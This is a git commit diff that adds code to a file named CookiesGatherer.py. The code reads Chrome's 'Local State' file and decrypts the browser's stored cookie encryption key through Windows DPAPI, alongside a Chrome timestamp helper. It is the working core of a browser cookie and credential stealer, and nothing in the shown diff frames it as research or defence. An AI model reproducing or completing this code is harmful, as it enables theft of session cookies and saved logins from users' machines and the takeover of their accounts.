c984d6354998b85d5023a75ce548246cca3176f2
Questi0nM4rk <56120540+Questi0nM4rk@users.noreply.github.com>
2023-09-01 19:51:10 +0200

    Cookies yaaay

--- Python/RequestSender/CookiesGatherer.py
+++ Python/RequestSender/CookiesGatherer.py
@@ -8,3 +8,39 @@ import win32crypt # pip install pypiwin32
 from Crypto.Cipher import AES # pip install pycryptodome
 
 
+def get_chrome_datetime(chromedate):
+    
+    if chromedate != 86400000000 and chromedate:
+        try:
+            return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
+        
+        except Exception as e:
+            print(f"Error: {e}, chromedate: {chromedate}")
+            return chromedate
+        
+    else:
+        return ""
+    
+
+def get_encryption_key():
+    local_state_path = os.path.join(os.environ["USERPROFILE"],
+                                    "AppData", "Local", "Google", "Chrome",
+                                    "User Data", "Local State")
+    
+    with open(local_state_path, "r", encoding="utf-8") as f:
+        local_state = f.read()
+        local_state = json.loads(local_state)
+
+    # decode the encryption key from Base64
+    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+    
+    # remove 'DPAPI' str
+    key = key[5:]
+    
+    # return decrypted key that was originally encrypted
+    # using a session key derived from current user's logon credentials
+    # doc: http://timgolden.me.uk/pywin32-docs/win32crypt.html
+    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
+
+
+
